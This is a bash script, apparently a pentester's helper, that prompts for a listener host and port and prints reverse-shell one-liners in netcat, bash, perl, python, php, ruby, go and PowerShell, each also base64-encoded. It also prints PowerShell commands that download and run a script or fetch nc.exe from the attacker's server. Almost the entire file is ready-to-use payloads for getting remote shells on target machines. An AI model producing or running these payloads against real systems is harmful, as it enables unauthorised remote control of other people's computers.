#!/bin/bash

# generate reverse-shells



# colours first
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'


# Header
echo -e "${RED}"
figlet "Generating Eeevil..."


echo -e ""
echo -e "Welcome to revshell"
echo -e "Select the type of revshell you want from this list..."
echo -e "1=netcat; 1b=nc-win; 2=nc-bsd; 3=bash; 4=perl; 5=python; 6=php; 7=ruby; 8=go; "
echo -e "Or some helpful powershell commands: 9=ps-revshell; 9a=iex (shell.ps1); 9b=iwr:"
echo -e "${NC}"
echo -e ""

# case statement
echo -e "${BLUE}"
read -p "Enter Selection: " langu
read -p "Enter lhost: " lhost
read -p "Enter lport: " lport
echo -e "${NC}"
#############################

echo -e "${YELLOW}"
echo -e "Don't forget to set a listener on $lport..." |cowsay
echo -e "${NC}"

if [ -z $langu ];then
	echo "Just a number please..."
	exit
fi

case $langu in
	1)
	 echo "nc $lhost $lport -e /bin/bash"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "nc $lhost $lport -e /bin/bash" |base64 -w0;;

	1b)
          echo ".\nc.exe $lhost $lport -e cmd"
	  echo -e "${YELLOW}And in base64 encoding! ${NC}"
	  echo ".\nc.exe $lhost $lport -e cmd" |base64 -w0;;

	2)
	 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" |base64 -w0;;

	3)
	 echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" |base64 -w0;;

	4)
	 echo "perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" |base64 -w0;;

	5)
	 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" |base64 -w0;;


	6)
	 echo "php -r '$sock=fsockopen("$lhost",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "php -r '$sock=fsockopen("$lhost",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" |base64 -w0;;

	7)
	 echo "ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" |base64 -w0;;

	8)
	 echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","$lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" |base64 -w0;;

	9)
	 echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" |base64 -w0;;


	9a)
	 echo "powershell -c iex(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
	 echo -e "${YELLOW}Remember to copy shell.ps1 to the PWD in Kali, and amend the last line! Then set a python server running! ${NC}"
	 echo -e "${YELLOW}python3 -m http.server 80${NC}"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "powershell -c iex(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')" |base64 -w0;;


	9b)
	 echo "powershell Invoke-WebRequest -uri http://$lhost/nc.exe -outfile c:\boo\nc.exe"
	 echo -e "${YELLOW}Dont forget to create 'boo' directory first, and serve file with a python server!${NC}"
	 echo -e "${YELLOW}python3 -m http.server 80${NC}"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "powershell Invoke-WebRequest -uri http://$lhost/nc.exe -outfile c:\boo\nc.exe" |base64 -w0;;


	*)
	 echo -e "${RED}Sorry, just numbers 1-9b please! ${NC}"
	 exit

esac

echo
 if [[ ! $REPLY =~ ^[Yy]$ ]]
        then
                exit 1
fi

